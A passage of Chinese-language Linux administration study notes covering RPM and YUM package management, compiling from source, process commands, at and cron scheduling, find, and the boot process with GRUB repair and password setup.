应用程序配置文件完整性破坏后的代码</p><pre><code> 5      MD5校验和 S      文件大小 L      符号连接 T      修改时间 D      设备 U      用户 G      组 M      模式(包括许可和文件类型)</code></pre></li></ul><ol start="7"><li><strong>重建数据库</strong></li></ol><ul><li>rpm  – rebuilddb  ：重建数据库，一定会重新建立</li><li>rpm  – initdb ：初始化数据库，没有才建立，有就不用建立</li></ul><ol start="8"><li><strong>检查</strong>来源合法性，及软件包完整性</li></ol><ul><li>ls /etc/pki/rpm-gpg/<ul><li>RPM-GPG-KEY-redhat-release</li></ul></li><li>rpm -K  /path/to/package_file<ul><li>dsa ，gpg：验证来源合法性，也即验证签名；可以使用  – nosignature，忽略此项</li><li>sha1，md5：验证软件包完整性；可以使用 –nodigest  ，忽略此项</li></ul></li><li>rpm  –import  /etc/pki/rpm-gpg/RPM-GPG-KEY-Centos-7</li></ul><h4 id="7-4-软件安装——YUM"><a href="#7-4-软件安装——YUM" class="headerlink" title="7.4 软件安装——YUM"></a>7.4 软件安装——YUM</h4><p>YUM 解决依赖关系，RPM进行安装卸载</p><p>yum采用C/S架构，依靠yum 仓库（web，ftp，file）</p><ul><li>yum配置文件：/etc/yum.conf</li><li>yum仓库：/etc/yum.repos.d/</li></ul><h5 id="7-4-1-yum功能："><a href="#7-4-1-yum功能：" class="headerlink" title="7.4.1 yum功能："></a>7.4.1 yum功能：</h5><pre><code>install:安装软件包update:升级软件包check-update:检查软件包的升级信息upgrade:更新软件包remove :卸载软件包list:显示所有已经安装和未安装的软件包info:查看软件包信息clean:清除软件包一些信息和网络源缓存search:查看指定软件包相关的软件包deplist:查询软件包依赖关系列表repolist:查看可用的yum源repoinfo:查看可用yum源的信息</code></pre><h5 id="7-4-2-yum源（-etc-yum-repos-d-）："><a href="#7-4-2-yum源（-etc-yum-repos-d-）：" class="headerlink" title="7.4.2 yum源（ /etc/yum.repos.d/ ）："></a>7.4.2 yum源（ <code>/etc/yum.repos.d/</code> ）：</h5><pre><code>//每个仓库分别是一个文件，文件名以.repo结尾[name]         //idname =         //引用变量baseurl =      //yum仓库 enabled =      //是否启用该yum仓库gpgcheck =     //是否进行完整性和校验和检测gpgkey =       //完整性和校验和检测文件</code></pre><p>yum仓库：</p><ul><li>$releasever：发行版本</li><li>$basearch：CPU架构集</li><li>$arch：CPU架构</li></ul><p>yum元数据目录：repodata</p><ul><li>primary.xml.gz ：所有RPM列表；依赖关系；软件包安装列表</li><li>filelist.xml.gz ：包含所有RPM 包的所有列表</li><li>other.xml.gz ：包含软件包其他信息，比如更改记录</li><li>repomd.xml：包含primary/filelist/other时间戳和校验和</li><li>comp.xml：包含软件包组的列表</li></ul><p><strong>创建元数据目录</strong></p><ul><li>先使用网络源安装createrepo<ul><li>yum -y install  createrepo</li></ul></li><li>在本地源（包含所有安装包的路径）下，创建元数据目录<ul><li>createrepo  /opt/repo    # 这个目录下提前放置了需要放到源中的安装包</li></ul></li><li>直接通过修改repo源，使用本地源即可</li></ul><h5 id="7-4-3-创建自己的yum源"><a href="#7-4-3-创建自己的yum源" class="headerlink" title="7.4.3 创建自己的yum源"></a>7.4.3 创建自己的yum源</h5><p>两台机器</p><ul><li><p><strong>yum源</strong>：192.168.10.10    </p></li><li><p>ftp方式: </p><ul><li># mount  /dev/cdrom  /media</li><li># yum  -y  install  vsftpd</li><li># systemctl  start  vsftpd</li><li># systemctl  enable  vsftpd</li><li># cp  -rf  /media/   /var/ftp   #(这个目录是Linux默认共享的ftp目录)</li></ul></li><li><p>httpd方式:</p><ul><li># mount   /dev/  cdrom/media</li><li># yum -y install  httpd</li><li># systemctl start  httpd</li><li># systemctl enable  httpd</li><li># cp -rf /media/   /var/www/html   #(这个目录是Linux下默认共享的http目录)</li></ul></li></ul><ul><li><p><strong>yum客户端</strong>(个人电脑)：192.168.10.20    </p></li><li><p>ftp:   vim   ftp.repo</p></li></ul><pre><code>[ftp]name=file_repobaseurl=ftp://192.168.10.10/mediaenable=1gpgcheck=1gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-Centos-7</code></pre><ul><li>httpd:  vim   httpd.repo</li></ul><pre><code>[httpd]name=httpd_repobaseurl=http://192.168.10.10/mediaenabled=1gpgcheck=1gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7</code></pre><ul><li>本地源： vim  file.repo</li></ul><pre><code>[httpd]name=httpd_repobaseurl=file:///media      #光盘挂载的目录enabled=1gpgcheck=1gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7</code></pre><p><strong>注意</strong>：在创建本地源时，可能会因为没有元数据目录（repodata）而导致失败，所以要创建元数据目，创建方法看上面  <strong>7.2 yum源</strong> –&gt;  创建元数据目录</p><h5 id="7-4-4-使用epel源"><a href="#7-4-4-使用epel源" class="headerlink" title="7.4.4  使用epel源"></a>7.4.4  <strong>使用epel源</strong></h5><p> <a href="https://mirrors.tuna.tsinghua.edu.cn/help/epel/" target="_blank" rel="noopener">https://mirrors.tuna.tsinghua.edu.cn/help/epel/</a> </p><h4 id="7-5软件安装——编译安装"><a href="#7-5软件安装——编译安装" class="headerlink" title="7.5软件安装——编译安装"></a>7.5软件安装——编译安装</h4><h5 id="7-5-1-安装开发工具组"><a href="#7-5-1-安装开发工具组" class="headerlink" title="7.5.1  安装开发工具组"></a>7.5.1  安装开发工具组</h5><p>包括gcc、g++等</p><ul><li>yum -y groupinstall “Development Tools”</li></ul><h5 id="7-5-2-编译链接工具"><a href="#7-5-2-编译链接工具" class="headerlink" title="7.5.2 编译链接工具"></a>7.5.2 编译链接工具</h5><ol><li><p>automake  —-&gt;  makefile.in(半成品)  –（通过configure）–&gt; makefile</p></li><li><p>autoconf ：生成脚本文件：configure，参照makefile.in 生成makefile</p></li><li><p>make：不是编译工具，而是项目管理工具，按照makefile文件中的定义，去定义软件中功能向后顺序</p></li><li><p>makeinstall：安装</p></li></ol><pre><code>#执行编译安装步骤1. 获取源代码并解压    # tar xf  xxx.tar.gz    # tar xf  xxx.tar.bz22. 执行configure脚本 （在源码目录中运行）  ./configure --...    功能：1.检查应用程序所需要的编译环境 2.生成Makefile 3.定制功能    选项：--help：进行查看脚本帮助信息    --prefix=path：定义应用程序安装路径    --sbin-path=PATH ：定义应用程序的二进制程序    --conf-path=PATH ：定义应用程序配置文件路径    --enable--xxx：开启某项功能（如应用程序支持该功能，但默认不安装）    --with--xxx：开启某项功能（如应用程序支持该功能，但默认不安装）    --without--xxx：关闭某项功能（如应用程序支持该功能，默认安装，但是我不需要）    --user=USER：指定应用程序执行的用户    --group=GROUP：执行应用程序执行的组    解决configure错误信息    1. 用without关闭这项功能（不建议使用）    2. 安装所需的环境，安装所需环境的开发包3. 执行make ：定义Makefile按照哪种顺序去编译源程序    -j N：多线程编译（速度快）4. make install ：安装应用程序//编译安装完成后工作：1:添加应用程序的二进制程序到系统路径:系统查找$PATH    1.1:为二进制程序做链接文件        # 1n -s /usr/ local/tengine/sbin/*  /usr/sbin        # ln -s /usr/local/tengine/sbin  /usr/sbin/tengine    1.2:修改/etc/profile文件    1.3:在/etc/profile.d/目录中建立name.sh的文件2:添加应用程序的库文件到系统库文件路径:库文件:/usr/lib  /usr/1ib64    2.1:为库文件做链接文件        # ln -s /usr/local/APP_NAME/lib/*  /use/lib        # ln -s /usr/local/APP_NAME/lib   /usr/lib/APP_NAME    2.2:在 /etc/ld.so.conf.d/ 目录下建立APP_NAME.conf，把应用程序的库文件位置添加进去        # ldconfig          -v ：显示加载库文件的过程3:添加应用程序的头文件到系统头文件路径:系统头文件:  /usr/include    3.1:为头文件做链接文件        # ln -s /usr/local/APP_NAME/include/*   /usr/include        # ln -s /usr/local/APP_NAME/include   /usr/include/APP_NAME4:添加应用程序的帮助信息    4.1:  man -M PATH bin_name   :-M 指定帮助信息的位置    4.2:  man配置文件：系统默认帮助：/usr/share/man/        centos6:: /etc/man.config   添加:MANPATH [HELP_PATH]        centos7:: /etc/man_db.conf  添加:MANPATH_MAP [HELP_PATH]</code></pre><h3 id="8-进程管理"><a href="#8-进程管理" class="headerlink" title="8. 进程管理"></a>8. 进程管理</h3><h4 id="8-1-进程的概念"><a href="#8-1-进程的概念" class="headerlink" title="8.1 进程的概念"></a>8.1 进程的概念</h4><p>进程：应用程序或者数据在系统中按照顺序执行的活动过程，是操作系统架构基础；</p><p><strong>本小节内容请学习操作系统原理</strong>，如已学习，可跳过不看</p><p>OS = kernel + process：进程只能运行在CPU和内存中</p><p>进程特性 ：动态性   并发性等</p><p>CPU分环运行：</p><ul><li>0环：特权环，运行内核  （内核空间）</li><li>1-2 环：库文件</li><li>3环 ：进程环（用户空间）</li></ul><p>CPU一个时间点只能运行一个程序，按照时间片</p><p>例：mkdir：  mkdir  /data ：system call ：系统   I/O</p><pre><code>task struck：进程的数据结构（存放在内核中）task struce结构：状态  进程信息和内核栈  运行列表（指令等）  MM（内存管理单元）PID ：进程ID号   群组信息   用户信息  文件系统  文件描述符等</code></pre><p> MMU：memory mangement unit ：内存管理单元</p><p>context switch ：进程切换，上下文切换</p><p>![](F:\Individual File\于召勇\typora note\Linux及编程\image-linux\进程.png)</p><p>进程内存结构：forbidden：内核空间</p><p>program text：指令</p><p>data+bss：全局变量</p><p>heap：堆空间</p><p>shared library ：共享库</p><p>stack：栈空间，进程运行时调用的数据</p><p>thread：线程，轻量级进程</p><p>运行进程的模式：多进程模式（每一个请求生成一个进程：进程切换）<br>单进程多线程：每个线程去响应</p><p>lock：死锁，自旋锁等</p><p>kernel ：内存管理  网络管理   安全管理   驱动管理   进程管理等</p><p>进程：父子关系   进程状态  优先级</p><p>进程优先级：0-139 数字，共140个优先级</p><ul><li><p>0-99  :系统优先级（用户不可控优先级）</p></li><li><p>100-139：nice值（用户可控优先级）；-20 到19；</p></li><li><p>root用户可以调整nice值；普通用户只能调0-19</p></li></ul><p>高优先级进程：获取更多的CPU运行时长，更优先的让CPU执行</p><p>大O标准：O(1)  O(n)  O(logn) O(2^n)  O(n^2)</p><h4 id="8-2-进程管理命令"><a href="#8-2-进程管理命令" class="headerlink" title="8.2 进程管理命令"></a>8.2 进程管理命令</h4><p>进程分类：</p><p>​            和终端相关的进程：用户进程</p><p>​            和终端无关的进程：内核进程</p><h5 id="8-2-1-ps"><a href="#8-2-1-ps" class="headerlink" title="8.2.1  ps"></a>8.2.1  <code>ps</code></h5><p> process status :进程状态查看，运行ps那个时刻系统进程状态；</p><p>BSD风格(不使用连字符)，sys V风格使用连字符)，GNU长选项(使用两个连字符)</p><ul><li>a：显示和终端有关的进程</li><li>u：显示进程用户的信息</li><li>x：显示和终端无关的进程</li><li>-e：显示所有进程信息</li><li>-l：显示进程长格式</li><li>-F：显示进程的完整信息</li></ul><pre><code>// 命令：ps au   //数据格式解析USER:该进程是有哪个用户发起的PPID:父进程号PID:进程号/proc目录存放着进程相关的信息。            在CentoS7中PID为1的进程是systemd            在CentOS6中PID为1的进程是init进程%CPU:该进程占用的CPU百分比%MEM:该进程占用内存的百分比VSZ:虚拟内存集（计算进程所占物理内存时，物理内存包括共享库的空间）RSS:常驻内存集（进程中不能被交换出去的）TTY:运行在哪个终端STAT:进程状态            D:不可中断睡眠状态            S:可中断睡眠状态            R:运行状态            T:停止状态            z:僵尸状态            s:session leader （会话的领导者）            &lt;:优先级较高的进程(用户不可控)            N:优先级较低的进程(用户可控进程)            1:多线程进程            L:在内存中锁定分页            +:前台进程组中的进程START:进程启动时间TIME:该进程在CPU中实际运行的时长COMMAND:该进程命令名称//ps -elF :结果解析//部分解析在上面已经介绍，不再重复，仅介绍几个常用的。    PRI ：系统分配的优先级（用户不可更改）    NI：nice值//调整进程的nice值的命令：    调整正在运行进程nice，（调整nice值就是为了影响系统优先级）        renice [nice number]  PID    指定进程运行的nice值（让某个&#39;命令&#39;以指定nice运行）        nice  -n  [nice_number]  COMMAND</code></pre><h5 id="8-2-2-top"><a href="#8-2-2-top" class="headerlink" title="8.2.2  top"></a>8.2.2  <code>top</code></h5><pre><code>//top结果解析第一行：当前系统时间   系统运行时长   登录系统的用户个数  过去1分钟，5分钟，15分钟平均负载第二行：进程总数  正在运行的进程数   睡眠的进程数  停止状态进程数  僵尸状态进程数第三行：CPU相关信息（按1键可查看每个CPU的信息）：us:用户进程所占CPU百分比  sy:系统进程所占CPU百分比  ni:nice所占CPU百分比  id:空闲进程所占CPU百分比  hi:硬件中断所占CPU百分比  si:软件中断所占CPU百分比  st:被hypervisor偷走的CPU的百分比第四行：物理内存相关信息第五行：交换分区相关信息 top交互式命令：    M:按所占内存百分比进行排序    P:按所占CPU百分比进行排序    T:按进程运行时长进行排序    c:是否显示command这一列的完整路径    l:是否显示top第一行    t:是否显示top第二行和第三行    m:是否显示内存的相关信息    k:杀死某个进程    q:退出top进程</code></pre><h5 id="8-2-3-其他相关命令"><a href="#8-2-3-其他相关命令" class="headerlink" title="8.2.3  其他相关命令"></a>8.2.3  其他相关命令</h5><ul><li><p><code>pstree</code>：查看进程树</p></li><li><p><code>pgrep</code>   ：查看某个进程的PID 号 pgrep  process_name</p></li><li><p><code>pidof</code>    ：查看某个进程的PID 号 pidof  process_name</p></li><li><p><code>kill</code>      ：杀死某个进程（向进程传递某个信号）</p><ul><li>kill -l  ：查看信号列表</li><li>信号列表（ 信号：进程间的通信 IPC ）<ul><li>1：SIGHUP ：不停止服务的情况下，重新读取配置文件，并且应用配置文件中的设置</li><li>2：SIGINT：（Ctrl+C）：中断某个进程</li><li>9：SIGKILL：强制杀死某个进程</li><li>15：SIGTERM：终止某个进程（默认信号）</li></ul></li><li>kill 语法：<ul><li>kill  - sig_number  PID</li><li>kill  - sig_name   PID </li><li>kill  %number   ：杀死后台某个作业，%不能省略</li></ul></li></ul></li><li><p><code>killall</code> ：杀死整个进程树，用法同kill</p></li></ul><ul><li><p>前台进程：利用终端执行的进程</p></li><li><p>后台进程：运行执行时不利用终端进行执行的进程</p></li><li><p>前台 ——&gt;  后台：（前台调入后台）</p><ul><li>Ctrl+z：把正在运行的进程调入后台，并停止运行</li><li><code>&amp;</code>：启动时直接调入后台运行</li></ul></li></ul><ul><li><p><code>jobs</code>：查看后台运行的作业</p><ul><li><code>+</code> ：下一次将要运行</li><li><code>-</code>：下一次将要运行的第二个后台作业</li><li><code>kill  %1</code>：杀死后台运行号为1的进程（注意加%）</li></ul></li><li><p><code>bg</code>：把进程调入后台继续运行</p></li><li><p><code>fg</code>：把后台进程调入前台继续运行  ‘fg  num’</p></li></ul><h3 id="9-任务计划"><a href="#9-任务计划" class="headerlink" title="9. 任务计划"></a>9. 任务计划</h3><h4 id="9-1-一次性任务计划"><a href="#9-1-一次性任务计划" class="headerlink" title="9.1 一次性任务计划:"></a>9.1 一次性任务计划:</h4><h5 id="9-1-1-at"><a href="#9-1-1-at" class="headerlink" title="9.1.1 at"></a>9.1.1 at</h5><ul><li><code>at</code>：设置系统在某一个时间点执行的任务，执行结果以邮件的方式发送给任务发起者</li><li>语法:</li></ul><pre><code># at data_timeat&gt;at_command1at&gt;at_command2at&gt;ctrl+d  //保存退出//注意：at任务计划需要atd服务的支持，atd服务开启方法# systemctl start atd# systemctl enable atd# systemctl status atd//Linux中设置at任务后，会在/var/spool/at/目录生成at任务计划的文件，按照文件名的排序顺序执行</code></pre><ul><li>data_time时间日期写法：</li></ul><pre><code>    绝对时间：        HH:MM:具体时间        DD.MM.YY：天.月.日        YY-MM-DD：年-月-日        MM/DD/YY：月/日/年        HH:MM YY-MM-DD    相对时间：        at now+3minutes：从任务计划创建时间开始的3分钟后执行</code></pre><ul><li>相关文件：<ul><li>/etc/at.allow  ：at任务计划的白名单，仅允许此文件中的用户执行at</li><li>/etc/at.deny ：at任务计划的黑名单，仅拒绝次文件中的用户执行at</li><li>系统先查找/etc/at.allow，再去查找/etc/at.deny，如果两个文件都没有，只有root用户能执行</li></ul></li><li><code>at</code>命令的相关参数：<ul><li>-l：查看系统中at任务列表，相当于atq</li><li>-r：删除系统中的at列表，相当于atrm</li><li>-d：删除系统中的at列表，相当于atrm</li><li>-c：列出后续at任务的具体指令内容</li></ul></li></ul><h5 id="9-1-2-batch"><a href="#9-1-2-batch" class="headerlink" title="9.1.2  batch"></a>9.1.2  batch</h5><p>用法与at相同，不过batch任务计划是在CPU空闲时执行，但CPU的负载小于0.8时执行batch设定的任务</p><ul><li>语法：与at基本一致，请查看at的语法和时间格式</li><li>uptime：查看CPU平均负载</li></ul><h4 id="9-2-周期性任务计划"><a href="#9-2-周期性任务计划" class="headerlink" title="9.2  周期性任务计划"></a>9.2  周期性任务计划</h4><h5 id="9-2-1-系统周期性任务"><a href="#9-2-1-系统周期性任务" class="headerlink" title="9.2.1 系统周期性任务"></a>9.2.1 系统周期性任务</h5><ul><li>日志轮换：logrotate</li><li>登录文件分析：logwatch</li><li>创建located数据库：</li><li>创建man帮助信息数据库：centos6：makewathis，centos7：mandb</li><li>RPM软件登录文件的创建</li><li>与网络相关的分析行为</li></ul><h5 id="9-2-2-用户周期性任务"><a href="#9-2-2-用户周期性任务" class="headerlink" title="9.2.2 用户周期性任务"></a>9.2.2 用户周期性任务</h5><ul><li>cron：设置周期性任务计划</li><li>anacron：当cron周期性任务由于某种原因没有执行，anacron重新执行cron任务</li></ul><h6 id="1-cron：设置周期性任务计划"><a href="#1-cron：设置周期性任务计划" class="headerlink" title="1.cron：设置周期性任务计划"></a>1.cron：设置周期性任务计划</h6><p>crond服务开启：</p><pre><code># systemctl start crond# systemctl enable crond# systemctl status crond</code></pre><p>相关文件：</p><ul><li>/etc/cron.allow  ：cron任务计划的白名单</li><li>/etc/cron.deny ：cron任务计划的黑名单，系统默认情况下保留黑名单</li><li>/etc/crontab：cron配置文件解析：</li></ul><pre><code>SHELL=/bin/bash   //各任务计划执行使用的shell程序PATH=/sbin:/bin:/usr/sbin:/usr/bin  //PATH路径MAILTO=root    //</code></pre><ul><li>/etc/cron.d：cron辅助配置文件目录（里面放的是脚本）</li><li>cron.hourly：由cron工具去执行</li><li>cron.daily   cron.weekly    cron.monthly  是由anacron工具去执行</li></ul><ul><li>/var/spool/cron：用户cron任务计划的配置文件，Linux用户设置完cron任务后，会在/var/spool/cron目录下生成以用户名名称的cron文件</li></ul><p><code>crontab</code>命令：<strong>设置/查看/删除cron任务计划</strong>，执行结果用邮件发送</p><ul><li>-e：编辑cron任务内容</li><li>-u：为指定用户设置cron任务计划（只有root用户能使用）</li><li>-l：查看cron任务列表  （/etc/crontab）</li><li>-r：删除所有的cron列表</li></ul><p>设置cron任务时间语法：</p><ul><li>系统设置：<ul><li>分   时   日   月   周   用户   命令</li></ul></li><li>用户设置：<ul><li>分   时   日   月   周   命令</li></ul></li><li>时间取值范围：<ul><li>分钟：0-59</li><li>小时：0-23</li><li>日期：1-31</li><li>月：1-12 （英文缩写也可以）</li><li>周：0-7（0和7都代表周日）（英文缩写也可以）</li><li><code>*</code> 代表任意</li><li>离散时间段： <code>,（逗号）</code><ul><li>5,15,30,45,56  17  *  *  *  cat  /etc/fstab</li><li>17点当中的 5分，15分，30分，45分，56分执行这个命令</li></ul></li><li>连续时间段：<code>-</code>（中横线）<ul><li>00  23  *  *  1-5  cat  /etc/fstab</li><li>周一到周五，每天23点00执行这个命令</li></ul></li><li>间隔时间段：<code>*/n</code> <ul><li>*/5  *  *  *  *   cat  /etc/fstab</li><li>每隔5分钟执行一次</li></ul></li></ul></li></ul><p>cron设置任务计划时注意事项：</p><ul><li>CPU和内存资源集中使用时的问题</li></ul><pre><code># vim  /etc/crontab1,6,11,16,21,26,31,36,41,46,51,56  * * * * root command1</code></pre><ul><li>取消一些不必要的输出：设置命令时可以重定向输出</li><li>时间的检验：设置时间时，周与日月不可并存</li><li>安全的检验：借由 /var/log/cron 的内容查看cron任务计划中是否有非法任务</li><li>环境变量：系统命令查找和cron任务命令位置由$PATH变量决定，设置cron任务时，使用<strong>命令的绝对路径</strong></li></ul><h6 id="2-anacron：当cron周期性任务由于某种原因没有执行，anacron重新执行cron任务"><a href="#2-anacron：当cron周期性任务由于某种原因没有执行，anacron重新执行cron任务" class="headerlink" title="2.anacron：当cron周期性任务由于某种原因没有执行，anacron重新执行cron任务"></a>2.anacron：当cron周期性任务由于某种原因没有执行，anacron重新执行cron任务</h6><ul><li>语法：</li></ul><pre><code>anacron [options] [job]    -s : 依据时间记录文件去判断是否执行    -f : 强制执行    -n : 立刻执行为运行的任务，不需要延时</code></pre><ul><li>相关文件：<ul><li>/etc/anacrontab    //该文件具体内容在Linux中查看</li><li>/var/spool/anacron</li></ul></li><li>执行流程：<ul><li>1.由/etc/anacrontab 分析到 cron.daily 天数为1天</li><li>2.由/var/spool/anacron/cron.daily 取出最近一次执行anacron时间戳</li><li>3.由2步骤分析出的时间戳和任务进行比较，查看哪些cron任务超过1天没有执行</li><li>4.准备执行指令，根据/etc/crontab的设置，将延时执行</li><li>5.延时时间过后，执行指令</li></ul></li></ul><h3 id="10-文件查找专题"><a href="#10-文件查找专题" class="headerlink" title="10. 文件查找专题"></a>10. 文件查找专题</h3><h4 id="10-1-常用查找"><a href="#10-1-常用查找" class="headerlink" title="10.1 常用查找"></a>10.1 常用查找</h4><p><code>which</code>：查找命令字所在位置</p><p> <code>located</code>：模糊匹配（只要包含关键字的文件都查找出来），不是实时的，基于数据库的查找，updatadb升级locate升级数据库</p><h4 id="10-2-find"><a href="#10-2-find" class="headerlink" title="10.2 find"></a>10.2 <code>find</code></h4><ul><li><p>功能：查看文件或目录的工具</p></li><li><p>精确查找</p></li><li><p>遍历整个指定目录中的文件，速度很慢</p></li><li><p>支持多种查找条件（属主，属组，权限，文件名等）</p></li></ul><p><strong>语法</strong>：<code>find  [find_path] [条件]  [处理动作]</code></p><ul><li>find_path：如果不写，默认在当前工作目录查找</li><li>条件：如果不写，会查找出该路径下所有的文件</li><li>处理动作：默认打印到屏幕上print</li></ul><p><strong>条件</strong>：（匹配标准）</p><ul><li><p><strong>-name</strong> file_name  ：根据文件名进行查找，区分大小写</p></li><li><p>-iname  file_name  ：根据文件名进行查找，不区分大小写</p></li><li><p><strong>-regex  PATTERN</strong>：根据正则表达式的模式进行查找</p></li><li><p>-user ：通过属主进行查找</p></li><li><p>-group：通过数组查找</p></li><li><p><strong>-uid  UID</strong>：通过UID号查找</p></li><li><p>-gid  GID：通过gid号查找</p></li><li><p>-nouser：查找没有属主的文件</p></li><li><p>-nogroup：查找没有属组的文件</p></li><li><p>-type：根据文件类型查找（b  c  d  f(文件)  p  s   l  ）</p></li><li><p>-size   [+ | - ]  ：</p><ul><li>-size   5k ：精确匹配5k大小的文件</li><li><code>+ 5k</code>：匹配大于5k的文件</li><li><code>- 5k</code>：匹配小于5k的文件</li></ul></li><li><p>-mtime：时间单位为天，modify时间（后面跟 +  - 号表示 大于小于）</p></li><li><p><strong>-atime</strong>：时间单位为天，access时间</p></li><li><p>-ctime：时间单位为天，change时间</p></li><li><p>-mmin：时间单位为分钟，modify时间</p></li><li><p>-amin：时间单位为分钟，access时间</p></li><li><p>-cmin：时间单位为分钟，change时间</p></li><li><p><strong>-perm  MODE</strong>：(MODE是权限)，精确匹配文件文件权限为MODE的文件</p></li><li><p><strong>-perm  /MODE</strong>：(MODE是权限)，任意一位匹配</p></li><li><p><strong>-perm  -MODE</strong>：(MODE是权限)，文件权限能够完全包含此MODE时才能匹配</p></li><li><p><strong>条件组合</strong>：</p><ul><li>-a：and 同时满足多个条件，find /tmp/  -user  tom  -a  -perm  644  -ls</li><li>-o：or 满足一个条件即可，find /tmp/  -user  tom  -o  -perm  644  -ls</li><li>-not  ：不满足条件的被查找出来</li></ul></li></ul><p><strong>处理动作</strong>：[action]</p><ul><li><p>-print：默认动作，默认查找结果打印到屏幕</p></li><li><p>-ls：默认以  <strong>ls -l</strong>   的形式显示结果信息</p></li><li><p><code>-ok COMMAND {} \;</code>：执行动作时提示用户是否执行（必须以  <code>\;</code>结尾，<code>{}</code>代表文件占位符）</p></li><li><p><code>-exec COMMAND {} \;</code>：执行动作时不提示用户，直接执行（要求同上）</p></li><li><p><strong>注意：使用通配时用引号括起来</strong></p></li></ul><h3 id="11-Linux-启动"><a href="#11-Linux-启动" class="headerlink" title="11. Linux 启动"></a>11. Linux 启动</h3><h4 id="11-1-启动过程"><a href="#11-1-启动过程" class="headerlink" title="11.1 启动过程"></a>11.1 启动过程</h4><p>进程管理：kernel+process<br>CPU：ring0：内核空间    ring1-2：库文件等    ring3：用户空间<br>CPU读取的数据都来自内存<br>内存：内核空间和用户空间，RAM：易失性存储器</p><p>PC：Linux启动过程： </p><ul><li>POST （加电自检（PowerOnSelfTest））—&gt;  BIOS（基本输入输出系统：Basic Input Output System：硬件信息；Boot Sequence ：启动顺序）—&gt;   MBR（主引导记录；446字节BootLoader）—&gt;   启动菜单（Linux启动菜单：GRUB）—&gt;   kernel  —&gt; initramfs（虚拟根文件系统） —&gt;   /sbin/init  </li></ul><p>kernel作用：（驱动和检测系统外围硬件或程序）文件系统、安全管理、网络管理、进程管理、驱动程序</p><p>内核设计：</p><ul><li>单内核：把所有的功能都集成到内核中去<ul><li>Linux使用单内核，模块化设计  /lib   /lib64 </li><li>/lib/modules/‘内核版本号为名称的目录’/kernel/   ：内核模块<ul><li>arch：平台架构相关</li><li>crypto：安全加密</li><li>drivers：驱动程序</li><li>fs：文件系统</li><li>kernel：内核</li><li>lib：内核库（.ko）</li><li>mm：memory mangement 内存管理</li><li>net：系统中TCP/IP协议栈</li><li>sound：声卡</li><li><strong>modules.dep：解决系统依赖关系</strong></li></ul></li></ul></li><li>微内核：把每一个功能都做成小模块  （Windows  、Solaris）</li></ul><p><strong>/boot/initramfs</strong>：centos 6，虚拟根文件系统，把 /sys   /dev   /proc目录复制到根文件系统</p><p><strong>/boot/initrd</strong>：centos 5 </p><p><strong>Linux运行级别</strong>：0-6</p><ul><li>0:halt关机</li><li>1:单用户模式(root，无须登录)，single，维护模式；</li><li>2:多用户模式，会启动网络功能，但不会启动NFS；维护模式；</li><li>3: 多用户模式，正常模式；文本界面；</li><li>4:预留级别；</li><li>5:多用户模式，正常模式；图形界面：GUI</li><li>6:重启</li></ul><p>chroot：改变根文件系统目录</p><p>ldd：查看二进制文件所依赖的库文件</p><h4 id="11-2-GRUB"><a href="#11-2-GRUB" class="headerlink" title="11.2  GRUB"></a>11.2  GRUB</h4><p>BootLoader：MBR（位于磁盘中0磁道0柱面，512字节），后安装系统的BootLoader会覆盖前一系统的BootLoader，安装双系统时，先安装Linux，再安装Windows</p><p>​                Windows：不允许其他系统引导，也不引导其他系统</p><p>​                Linux：GRUB：默认的BootLoader</p><p>GRUB配置文件 ：/boot/grub/grub.conf 的解释</p><pre class=" language-sh"><code class="language-sh">default=0  //默认引导系统timeout=5  //GRUB引导系统超时时间splashimage=(hd0,0)/grub/splash.xpm.gz  //引导系统时的图片hiddenmenutitle CentOS 6 (2.6.32-642.el6.x86_64)                             //系统title以及在grub中显示是名称    root (hd0,0)   //根所在的位置    kernel /vmlinuz-2.6.32-642.el6.x86_64 ro root=UUID=ef361140-6306-423c-90f0-63a93c664f96 rd_NO_LUKS rd_NO_LVM LANG=en_US.UTF-8 rd_NO_MD SYSFONT=latarcyrheb-sun16 crashkernel=auto EYBOARDTYPE=pc KEYTABLE=us rd_NO_DM rhgb quiet      initrd /initramfs-2.6.32-642.el6.x86_64.img//解释：//kernel /vmlinuz-2.6.32-220.el6.x86_64 :制定内核文件的位置//ro: 刚开始以只读方式挂载根文件系统//root=UUID=ef361140-6306-423c-90f0-63a93c664f96 : root根 分区设备位置//rd_NO_LUKS LANG=en_US.UTF-8 rd_NO_MD: 为了加速引导启动进程，可以指定磁盘是否加密、语言环境、不启用LVM、RAID、键盘等等，节省dracut查找的时间//SYSFONT=latarcyrheb-sun16 KEYTABLE=us: 对于有加密磁盘的系统启动，可以指定键盘规格和字体显示等//quiet:启动过程中只有重要信息显示，类似硬件自检的消息不回显示//rhgb: RedHat graphics boot,就是会看到图片来代替启动过程中显示的文本信息，这些信息在启动后用dmesg也可以看到</code></pre><p><strong>GRUB分阶段启动</strong>：</p><ul><li><p>stage1：第一阶段，位于BootLoader，为了引导第二阶段</p></li><li><p>stage1_5：识别文件系统</p></li><li><p>stage2：加载启动设置等等，读取配置文件/boot/grub/grub.conf</p></li></ul><p><strong>GRUB修复</strong>：（使用光盘启动（BIOS调启动顺序），选择救援模式）</p><pre><code># chroot  /mnt/sysimage# grub-install  --root-directory=/  /dev/sda              //注意：此处写/，是因为boot是一个独立的分区，如果没有独立，就应该写绝对路径，例如 /boot/，/dev/sda是指定第一块磁盘# grubgrub&gt;  root (hd0,0)       //磁盘0扇区，0柱面grub&gt;  setup (hd0)grub&gt;  quit# vi /boot/grub/grub.conf  //准备（自己写）这个文件，内容及格式与上面的一样# reboot     //前面的做完了就重启，注意在BIOS中调一下启动顺序</code></pre><p><strong>为GRUB启动菜单添加密码</strong>：</p><pre><code>#  grub-crypto  --sha-512    //生成加密密码#  vim /boot/grub/grub.conf    //在这个文件中hidden menu那一行下添加一行：  password --encryped  密文   //因为是sha加密，所以使用--encryped，如果是md5加密，应该使用 --md5 密文</code></pre><p><strong>为系统添加启动密码</strong>：</p><pre><code>#  grub-md5-crypto     //生成加密密码#  vim /boot/grub/grub.conf    //在这个文件中title那一行下添加一行：  password --md5  密文   //因为是md5加密，所以使用--md5</code></pre><h4 id="11-3-kernel、centos6—upstart-init"><a href="#11-3-kernel、centos6—upstart-init" class="headerlink" title="11.3 kernel、centos6—upstart init"></a>11.3 kernel、centos6—upstart init</h4><p><strong>Linux内核与内核模块相关文件及位置</strong>:</p><ul><li><p>内核: /boot/ vmlinuz-version</p></li><li><p>initramfs : /boot/ initramfs-kernel_version</p></li><li><p>内核模块: 